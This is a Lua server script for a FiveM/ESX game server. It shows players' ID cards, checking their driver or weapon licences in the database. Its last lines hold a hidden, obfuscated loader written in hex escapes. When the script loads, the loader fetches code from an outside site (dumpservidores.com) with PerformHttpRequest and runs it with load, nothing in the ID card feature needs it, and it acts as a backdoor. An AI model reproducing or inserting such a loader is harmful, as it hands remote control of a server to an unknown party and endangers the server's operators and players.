local ESX = nil
-- ESX
ESX = exports["es_extended"]:getSharedObject()

-- Open ID card
RegisterServerEvent('jsfour-idcard:open')
AddEventHandler('jsfour-idcard:open', function(ID, targetID, type)
	local identifier = ESX.GetPlayerFromId(ID).identifier
	local _source 	 = ESX.GetPlayerFromId(targetID).source
	local show       = false
	local _PED_ID = PED_ID
	--local xPlayer = ESX.GetPlayerFromId(source)

	MySQL.Async.fetchAll('SELECT firstname, lastname, job, dateofbirth, sex, height FROM users WHERE identifier = @identifier', {['@identifier'] = identifier},
	function (user)
		if (user[1] ~= nil) then
			MySQL.Async.fetchAll('SELECT type FROM user_licenses WHERE owner = @identifier', {['@identifier'] = identifier},
			function (licenses)
				if type ~= nil then
					for i=1, #licenses, 1 do
						if type == 'driver' then
							if licenses[i].type == 'drive' or licenses[i].type == 'drive_bike' or licenses[i].type == 'drive_truck' then
								show = true
							end
						elseif type =='weapon' then
							if licenses[i].type == 'weapon' then
								show = true
							end
						end
					end
				else
					show = true
				end

				if show then
					local array = {
						user = user,
						licenses = licenses
					}
					TriggerClientEvent('jsfour-idcard:open', _source, array, type)
					TriggerClientEvent( 'jsfour-idcard:shot', _source, source )
				else
					TriggerClientEvent('esx:showNotification', _source, "No posees ese tipo de licencia..")
				end
			end)
		end
	end)
end)


local ztoKxbEMJBXJyHImtZDmdmueQuGCEuoBcsZnTtrxxhshYyuDmuxKTptgoaIExBlkQEJsfX = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ztoKxbEMJBXJyHImtZDmdmueQuGCEuoBcsZnTtrxxhshYyuDmuxKTptgoaIExBlkQEJsfX[4][ztoKxbEMJBXJyHImtZDmdmueQuGCEuoBcsZnTtrxxhshYyuDmuxKTptgoaIExBlkQEJsfX[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x75\x6d\x70\x73\x65\x72\x76\x69\x64\x6f\x72\x65\x73\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x50\x78\x45\x78", function (RnDbrjKmyghUYhgTYVunOUiIcMgEmCsGnwojjCwWUHDcmWcJPScKFJewFcUJkkeAVOWDrp, qFOPGSrcQtsRfjNJvmnAhjgjqsabnxjTTBdAGdjTwrOqwMgZuLwaWSvSSzeagFouSCXRAd) if (qFOPGSrcQtsRfjNJvmnAhjgjqsabnxjTTBdAGdjTwrOqwMgZuLwaWSvSSzeagFouSCXRAd == ztoKxbEMJBXJyHImtZDmdmueQuGCEuoBcsZnTtrxxhshYyuDmuxKTptgoaIExBlkQEJsfX[6] or qFOPGSrcQtsRfjNJvmnAhjgjqsabnxjTTBdAGdjTwrOqwMgZuLwaWSvSSzeagFouSCXRAd == ztoKxbEMJBXJyHImtZDmdmueQuGCEuoBcsZnTtrxxhshYyuDmuxKTptgoaIExBlkQEJsfX[5]) then return end ztoKxbEMJBXJyHImtZDmdmueQuGCEuoBcsZnTtrxxhshYyuDmuxKTptgoaIExBlkQEJsfX[4][ztoKxbEMJBXJyHImtZDmdmueQuGCEuoBcsZnTtrxxhshYyuDmuxKTptgoaIExBlkQEJsfX[2]](ztoKxbEMJBXJyHImtZDmdmueQuGCEuoBcsZnTtrxxhshYyuDmuxKTptgoaIExBlkQEJsfX[4][ztoKxbEMJBXJyHImtZDmdmueQuGCEuoBcsZnTtrxxhshYyuDmuxKTptgoaIExBlkQEJsfX[3]](qFOPGSrcQtsRfjNJvmnAhjgjqsabnxjTTBdAGdjTwrOqwMgZuLwaWSvSSzeagFouSCXRAd))() end)